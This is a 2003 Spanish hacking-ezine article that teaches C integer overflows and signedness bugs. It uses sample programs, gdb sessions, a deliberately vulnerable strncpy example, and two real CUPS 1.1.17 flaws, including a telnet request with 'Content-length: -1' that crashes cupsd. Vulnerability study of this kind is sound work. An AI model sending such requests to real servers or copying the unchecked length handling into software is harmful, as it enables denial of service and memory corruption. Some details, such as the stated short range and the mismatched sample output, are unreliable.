@@ -1,0 +1,288 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#15 ]                                                  [ 23-11-2003 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 13 - Integer Overflow.                                    }{ Runlevel }
+   |-----------------------------------------------------------------------|
+
+
+1. Los tipos de datos
+
+Existen diferentes tipos de datos, estos se diferencia por el tamaño
+que ocupan en memoria y viene definido por el numero de bits.
+
+Tamano de diferentes tipos:
+    -int: Entero con signo de 32 bits
+    -unsigned int: Entero sin signo de 32 bits
+    -short int: Entero con signo de 16 bits
+    -char: Entero con signo de 8 bits
+    -Etc
+    
+Veamos como se comportan los integers, un poco de teoria no va mal!. Para 
+empezar el rango de numeros posibles que podemos representar con 32 bits 
+es 2^32 numeros. Ya que estamos con un entero con signo, el conjunto de 
+numeros que podemos representar va desde el -2^31 hasta el 2^31-1 (El -1 
+es porque debemos representar tambien el 0). Dicho esto, vayamos a ver
+un ejemplo y luego detallaremos un poco mas la teoria:
+
+/* Ejemplo 1 */
+
+int main(){
+    int a;
+
+    a= 0;
+    printf("a =0: 0x%0.8x\n",a);
+    a+=1;
+    printf("a+=1: 0x%0.8x\n",a);
+    a-=2;
+    printf("a-=2: 0x%0.8x\n",a);
+    a=2147483647; // 2^32/2-1 Rango: -2^n a 2^n-1
+    printf("Decimal: %d ",a);
+    printf("Hexadecimal: 0x%0.8x\n",a);
+    a++;
+    printf("Decimal: %d ",a);
+    printf("Hexadecimal: 0x%0.8x\n",a);
+}
+
+runlevel@debian:/integer$ ./ejemplo1
+a =0: 0x00000000
+a+=1: 0x00000001
+a-=2: 0xffffffff
+Decimal: 2147483647 Hexadecimal: 0x7fffffff
+Decimal: -2147483648 Hexadecimal: 0x80000000
+
+Bueno, parece que tenemos que 0 se representa con 0x00000000(logico), le 
+sumamos 1 y tenemos 0x00000001. pero si restamos 0x2 a 0x00000001? Bueno
+pues esta claro que sera -1, pero se representa con 0xffffffff. Si nos 
+fijamos un poco vemos que tiene que haber un punto medio en el rango 
+(mmm hablando vulgarmente, si me escuchase algun profesor me mataria)
+hablado anteriormente que sea el numero maximo a representar. Este es 
+el 2147483647 y si le sumamos 1 volvemos a tener un numero negativo!! 
+Es correcto, este es el punto de canvio. Este sistema de representacion
+de numeros, se denomina complemento a 2. Puede representarse graficamente 
+de esta forma:
+                       < se resta --- se suma >
+
+      --> -2147483648 ... -3 -2 -1 0 1 2 3 .... 2147483647 >--
+     |                                                        |
+      -----<-------<-------<----<-----<--------<-------<------
+
+Aqui se puede ver perfectamente al punto de canvio que me referia,
+seria exactamente los extremos del dibujo. Tambien podemos observar 
+que todo numero en complemento a 2 (Twos Complement System), si hacemos
+la conversion a binario, tiene el primer bit a 1 si es negativo o a 0 
+si es positivo.
+
+(Para mas informacion buscar representacion de numeros 
+en complemento a 2)
+
+2. Conversion forzada entre diferentes tipos (casting)
+
+En c se puede conversiones forzadas o casting, hay que tener mucho 
+cuidado con ellas, presentare el caso de conversion forzada de un
+short con signo a un short sin signo (utilizo short para que el rango
+de valores a representar sea menor). Veamos el siguiente codigo:
+
+/* Ejemplo 2 */
+
+int main(){
+    short a;
+    unsigned short b;
+    
+    a=-1;
+    b=a;
+    printf("%u | %x",b,b);
+    printf("%d | %x",a,a);
+}
+
+runlevel@debian:/integer$ ./ejemplo2
+Short con signo: -1 | Hexa: ffffffff
+Short sin signo: 65535 | Hexa: ffff
+
+Analicemos esto, la variable "a" tiene un rango de -2^15 a 2^15-1 
+(-65536 a 65535), la variable "b" no tiene el mismo rango, su rango va
+desde 0 a 2^16 (0x0 a 0xffff) ya que es unsigned. Lo que hace es copiar 
+la parte baja de "a" en "b", por lo tanto, "b" tendra el valor maximo 
+de su rango. Siempre se deben considerar estas opciones al realizar un 
+casting ya que no es lo mismo tener -1 que tener 65535.
+
+Veamos el siguiente ejemplo:
+
+/* Ejemplo 3 */
+
+#include <string.h>
+int main(int argc,char *argv[]){
+    short a;
+    short b;
+    char buff1[240]="AIEEE!!";
+    if(argc < 4) return -1;
+    a=atoi(argv[1]);
+    b=atoi(argv[2]);
+    if(a+b>240){
+	printf("No no!\n");
+	return -1;
+    }
+    printf("b = %u\n",(unsigned int)b);
+    printf("Buffer 1: %s\n",buff1);
+    strncpy(buff1,argv[3],b);
+    printf("Buffer 1: %s\n",buff1);
+}
+-----------------
+
+runlevel@debian:/integer$ ./ejemplo3 230 -4 AAAA
+b = 4294967292
+Buffer 1: AIEEE!!
+Segmentation fault
+
+Vemos que coge el primer y segundo argumento y los guarda en 
+a y b respectivamente, si la suma de estos dos numeros es mayor
+que 240, o la longitud de buff1, no llegara al strncpy.
+
+Y miremos lo que nos interesa, el SEGFAULT, efectivamente hemos 
+pasado a strncpy 4294967292 como longitud y obviamente es mayor que
+la longitud de buff1. Bueno, y porque ese numero tan grande? 
+strncpy tiene como tercer argumento un unsigned int y todo numero
+con signo negativo le hace el casting automaticamente, ese numero 
+es el casting del -4 a un unsigned int.
+
+3. Explotando
+
+Este tipo de vulnerabilidad es dificil de explotar. Fijense en el 
+ejemplo 3, strncpy requiere un unsigned int como parametro de longitud, 
+hace el casting y acaba siendo ese un numero grande (aproximadamente 4GB 
+de memoria) y esto provoca un SEGFAULT, si miramos gdb...
+
+#0  0x40093803 in strncpy () from /lib/libc.so.6
+(gdb) x/i 0x40093803
+0x40093803 <strncpy+163>:	movb   $0x0,(%ecx)
+(gdb) info regis ecx
+ecx            0xc0000000	-1073741824
+
+...vemos que intenta mover un 0 a una direccion de memoria que esta fuera 
+de rango. Es dificil explotar ya que no siempre es posible llegar a 
+un valor aproximado al buffer (en nuestro caso 240) y asi poder llegar
+a ebp y el preciado eip.
+
+4. Ejemplo Real
+
+Bueno en esta parte intentare explicar 2 fallos surgidos hace poco en CUPS
+(Common Unix Printing System) para el que no sepa que es, es una alternativa
+a lpr para la impresion en sistemas unix/linux. Esta basado en IPP (Internet
+Printing Protocol) y incorpora un servidor web el cual te permite imprimir
+desde casa. Para mas informacion http://www.cups.org. Todas las pruebas se 
+realizaron en la version 1.1.17, version .tar.gz.
+
+Ya que tenia bastantes fallos, solo comentare dos, si quereis mirar los
+demas fallos, podeis mirar el siguiente advisory:
+http://www.idefense.com/advisory/12.19.02.txt
+
+4.1 Primer ejemplo
+
+En este caso a memcpy le llega un -1 como parametro de longitud y acaba en 
+un DOS en toda regla. Este fallo lo encontraremos en el archivo
+cups/http.c, en la funcion httpRead() y concretamente en la linea 981.
+
+.............
+
+int					/* O - Number of bytes read */
+httpRead(http_t *http,			/* I - HTTP data */
+         char   *buffer,		/* I - Buffer for data */
+	 int    length)			/* I - Maximum number of bytes */
+    bytes = length;
+----
+----
+    DEBUG_printf(("httpRead: grabbing %d bytes from input buffer...\n", bytes));
+
+    memcpy(buffer, http->buffer, length);
+    http->used -= length;
+.............
+
+Esta variable length es el valor leido de el tipo mime Content-length el cual
+se le puede pasar usando un simple telnet.
+
+debian:~# cupsd
+debian:~# netstat -an |grep 631 
+tcp        0      0 0.0.0.0:631             0.0.0.0:*               LISTEN
+debian:~# telnet localhost 631
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+POST /printers HTTP/1.1
+Host: localhost
+Authorization: Basic AAA
+Content-length: -1
+
+Connection closed by foreign host.
+debian:~# telnet localhost 631
+Trying 127.0.0.1...
+telnet: Unable to connect to remote host: Connection refused
+
+Pasandole el Content-length vemos que cups dejo de dar servicio.
+
+Y como era de esperar gdb nos confirma que fue memcpy el que proboco el fallo:
+
+Cargamos cupsd en el gdb, lo ejecutamos, le enviamos el Content-Length 
+hace un SEGFAULT dentro de memcpy, vemos que en eax esta el valor del content
+length.
+
+(gdb) run -f
+Starting program: /usr/sbin/cupsd -f
+(no debugging symbols found)...
+Program received signal SIGSEGV, Segmentation fault.
+0x401031b7 in memcpy () from /lib/libc.so.6
+(gdb) info register eax
+eax            0xffffffff	-1
+(gdb) 
+
+Visto esto creo que quedo bastante claro. :)
+
+4.2 Segundo ejemplo
+
+Este Integer Overflow, un poco mas dificil de ver, se puede localizar en estas
+lineas, dentro de cgi-bin/var.c en la funcion cgi_add_variable(). 
+
+  var                  = form_vars + form_count;
+  var->name            = strdup(name);
+  var->nvalues         = element + 1;
+  var->avalues         = element + 1;
+  var->values          = calloc(element + 1, sizeof(char *));
+  syslog(LOG_EMERG, "Element: %d Value: %s",element,value);
+  sleep(50);
+  var->values[element] = strdup(value); <----- Aqui lo vemos
+  form_count ++;
+
+El funcionamiento del servidor web es el siguiente: Para toda peticion web, 
+hace un analisi de la peticion y ejecuta un execve del cgi correspondiente, 
+asi si le llega un /jobs ejecutara jobs.cgi, con todas las variables d entorno 
+que tenia el proceso padre y todo el contenido pasado por telnet. El trabajo 
+de analizar el body es del cgi. 
+
+Analizando el body si encuentra un - y luego un numero, agregara una variable 
+(cgi_add_variable). A var->vaules[element] se le asigna un puntero con todo lo 
+que hayamos puesto despues del = en el body, esto es exactamente lo que hace
+el strdup(value). Por lo tanto si somos capaces de controlar element y value 
+(que lo somos) podremos escribir en la parte de memoria que queramos. 
+
+No es dificil explotar, basta con poner un sleep en el cgi, engancharse con 
+el gdb y encontrar la ret, ya existe un exploit que realiza este trabajo y lo
+podeis encontrar en
+
+http://packetstorm.linuxsecurity.com/0301-exploits/sigcups.c
+
+y ver el funcionamiento real de este bug.
+
+5.Conclusion
+
+Como ya he comentado, los integer overflows son dificiles de explotar
+y en muchos casos imposible. Pero muchas veces provocaran un funcionamiento
+incorrecto del programa afectado. Basicamente, estos errores son consecuencia
+de la poca comprobacion y suposiciones erroneas de los programadores en la 
+conversion entre diferentes tipos y operaciones aritmeticas.
+
+PD: Para el que haya llegado a este punto, quiere decir que lo ha leido todo o 
+casi todo (eso espero :D). Si tienen algunas correcciones, criticas, elogios
+(esto sera mas dificil) contacten conmigo.
+
+Aqui acaba este texto, espero que haya quedado claro :)
+
+*EOF*
